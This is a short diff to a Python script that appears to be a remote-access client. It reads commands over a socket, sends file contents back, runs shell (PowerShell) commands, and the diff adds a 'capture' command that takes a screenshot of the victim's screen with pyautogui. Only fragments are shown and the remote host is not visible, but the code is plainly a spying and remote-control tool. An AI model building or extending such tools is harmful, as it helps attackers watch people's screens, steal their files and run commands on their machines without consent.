@@ -1,6 +1,7 @@
 import socket
 import os
 import subprocess
+import pyautogui 
 import time 
 
 CHUNK_SIZE = 1024
@@ -56,15 +57,15 @@ while True:
                     sender += data
                     data =f.read(CHUNK_SIZE)
 
+                print(type(data))
                 sender += identifier.encode()
-                print(sender.decode())
                 s.send(sender)
                 continue
 
-
-
-
-
+    elif command == "capture":
+        screenshot = pyautogui.screenshot()
+        screenshot.save("screenshot.png")
+        message = "screenshot capturedd"
 
     #for running a command on pwershell
     else:
